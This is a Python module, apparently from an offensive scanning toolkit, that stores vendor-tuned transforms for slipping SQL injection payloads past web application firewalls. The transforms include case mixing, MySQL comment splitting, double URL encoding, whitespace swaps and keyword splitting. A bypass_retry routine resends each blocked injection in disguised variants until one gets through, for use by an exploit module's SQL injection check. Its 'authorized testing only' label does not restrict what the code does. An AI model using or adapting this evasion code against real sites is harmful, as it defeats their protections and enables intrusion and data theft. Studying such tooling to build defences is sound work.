"""VANTHEX — WAF-aware payload bank v2 (v1.2.3).

AUTHORIZED TESTING ONLY. This module only reshapes benign, read-only probe
payloads to help an authorized scanner distinguish an application's own
behavior from a blocking inspection layer. No destructive capability is
added; every transform is form-only (semantics preserved).

Design:
  * BANK: fingerprint -> ordered list of (transform_name, callable str->str).
    Fingerprints follow the vendor names produced by wafscore.best_vendor
    (normalized via normalize_vendor); anything unknown degrades to
    "generic".
  * payload_for(fingerprint, base_payloads, max_per=6): ordered, deduped
    list of (transform_name, payload). Transforms that do not change a
    payload are skipped. Deterministic: same inputs -> same outputs.
  * bypass_retry(...): reusable helper for injection checks — when the
    first attempt at a WAF-protected parameter is BLOCKED (403/406 or a
    block-page marker), retry with banked variants for the fingerprint and
    report which transform got through. The caller owns the request budget
    (cap 12 extra requests per check, enforced here via the returned
    remaining budget).

Integration: exploitkit.c_sqli_confirm and vulnscan2.c_web_injection call
bypass_retry when a WAF fingerprint was detected earlier in the scan
(stored on ctx as _waf_vendor by vulnscan2.c_waf_detection).
"""

import payloadforge as pf

AUTHORIZED_HEADER = "AUTHORIZED TESTING ONLY"

# ------------------------------------------------------------ transforms
# Pure str -> str functions. Each preserves the payload's semantics; only
# the wire form changes. Reuse payloadforge primitives where they exist
# (enc_double_url) instead of duplicating logic.

_KEYWORDS = ("select", "union", "or", "and", "sleep", "order", "by",
             "from", "where", "concat", "extractvalue", "cast")


def _case_mix(s):
    """Alternate-case the payload (SeLeCt) — defeats naive case filters."""
    return "".join(c.upper() if i % 2 else c.lower()
                   for i, c in enumerate(s))


def _sql_comment(s):
    """Split SQL keywords with a MySQL version-comment: se/*!*/lect."""
    out = []
    for tok in s.split(" "):
        low = tok.lower().strip("`'\"();,")
        if low in _KEYWORDS and len(tok) >= 2:
            mid = max(1, len(tok) // 2)
            out.append(f"{tok[:mid]}/*!*/{tok[mid:]}")
        else:
            out.append(tok)
    return " ".join(out)


def _double_url(s):
    """Double URL-encode the payload (pf primitive reused)."""
    return pf.enc_double_url(s)


def _ws_tab(s):
    """Whitespace alternative: space -> %09 (tab)."""
    return s.replace(" ", "%09")


def _ws_newline(s):
    """Whitespace alternative: space -> %0a (newline)."""
    return s.replace(" ", "%0a")


def _keyword_split(s):
    """Split keywords into a string-concatenation form: sel'||'ect."""
    out = []
    for tok in s.split(" "):
        low = tok.lower().strip("`'\"();,")
        if low in _KEYWORDS and len(tok) > 3:
            mid = max(2, len(tok) // 2)
            out.append(f"{tok[:mid]}'||'{tok[mid:]}")
        else:
            out.append(tok)
    return " ".join(out)


def _json_wrap(s):
    """Wrap the payload in a JSON body value (JSON-context filters)."""
    return '{"value": "%s"}' % s.replace('"', '\\"')


# name -> callable (single source of truth; BANK references these)
TRANSFORMS = {
    "case-mix": _case_mix,
    "sql-comment": _sql_comment,
    "double-urlencode": _double_url,
    "whitespace-tab": _ws_tab,
    "whitespace-newline": _ws_newline,
    "keyword-split": _keyword_split,
    "json-wrap": _json_wrap,
}

# fingerprint -> ordered transform names (vendor-tuned order)
BANK = {
    "cloudflare": ["double-urlencode", "case-mix", "whitespace-tab",
                   "sql-comment", "keyword-split", "json-wrap",
                   "whitespace-newline"],
    "aws-waf": ["keyword-split", "sql-comment", "case-mix",
                "whitespace-newline", "double-urlencode", "whitespace-tab",
                "json-wrap"],
    "modsecurity": ["sql-comment", "whitespace-tab", "case-mix",
                    "keyword-split", "double-urlencode", "whitespace-newline",
                    "json-wrap"],
    "imperva": ["case-mix", "double-urlencode", "sql-comment",
                "whitespace-newline", "keyword-split", "whitespace-tab",
                "json-wrap"],
    "generic": ["case-mix", "sql-comment", "double-urlencode",
                "whitespace-tab", "whitespace-newline", "keyword-split",
                "json-wrap"],
}

# vendor strings wafscore may emit -> bank keys
_VENDOR_MAP = (
    ("cloudflare", "cloudflare"),
    ("aws waf", "aws-waf"),
    ("modsecurity", "modsecurity"),
    ("mod_security", "modsecurity"),
    ("imperva", "imperva"),
    ("incapsula", "imperva"),
)

BLOCK_STATUSES = (403, 406)
BLOCK_WORDS = ("blocked", "access denied", "request rejected",
               "security policy", "web application firewall",
               "attention required", "mod_security", "request blocked")


def normalize_vendor(name):
    """Map a wafscore vendor label to a BANK fingerprint key."""
    n = (name or "").strip().lower()
    for needle, fp in _VENDOR_MAP:
        if needle in n:
            return fp
    return "generic"


def is_blocked(status, body):
    """True when a response looks like a WAF block (403/406 or marker)."""
    if status in BLOCK_STATUSES:
        return True
    b = (body or "").lower()
    return any(w in b for w in BLOCK_WORDS)


def payloads_for(fingerprint, base_payloads, max_per=6, log=None):
    """Ordered, deduped [(transform_name, payload)] for a fingerprint.

    Deterministic. At most max_per variants per base payload; transforms
    whose output equals the input are skipped. Logs
    '[wafbank] N bypass payloads for <fingerprint>' when log is given.
    """
    fp = normalize_vendor(fingerprint)
    names = BANK.get(fp) or BANK["generic"]
    out, seen = [], set()
    for base in base_payloads:
        if not base or not isinstance(base, str):
            continue
        produced = 0
        for name in names:
            if produced >= max_per:
                break
            fn = TRANSFORMS[name]
            try:
                v = fn(base)
            except Exception:
                continue
            if not v or v == base or v in seen:
                continue
            seen.add(v)
            out.append((name, v))
            produced += 1
        if produced >= max_per:
            continue
    if log is not None:
        try:
            log(f"[wafbank] {len(out)} bypass payloads for {fp}")
        except Exception:
            pass
    return out


def bypass_retry(ctx, send, payload, budget, err_check=None, log=None):
    """Retry one blocked payload with banked variants for the detected WAF.

    Args:
        ctx: scan context carrying `_waf_vendor` (set by c_waf_detection).
        send: callable(str) -> response; performs the request.
        payload: the base payload that was BLOCKED on the first attempt.
        budget: remaining extra-request budget for the whole check (cap 12).
        err_check: callable(body) -> truthy when a variant HIT (produced the
            backend signature the block hid). When None, the first variant
            that is NOT blocked counts as a hit.
        log: logger (e.g. ctx.L).

    Returns (transform_name, resp, remaining_budget) on a hit, else
    (None, None, budget). Never exceeds the budget; honours ctx.cancelled().
    """
    fp = getattr(ctx, "_waf_vendor", None)
    if not fp or budget <= 0:
        return None, None, budget
    variants = payloads_for(fp, [payload], max_per=6, log=log)
    remaining = budget
    for name, v in variants:
        if remaining <= 0 or ctx.cancelled():
            break
        remaining -= 1
        try:
            r = send(v)
        except Exception:
            continue
        body = getattr(r, "body", "") or ""
        status = getattr(r, "status", 0) or 0
        if err_check is not None:
            if err_check(body):
                return name, r, remaining
        elif not is_blocked(status, body):
            return name, r, remaining
    return None, None, remaining
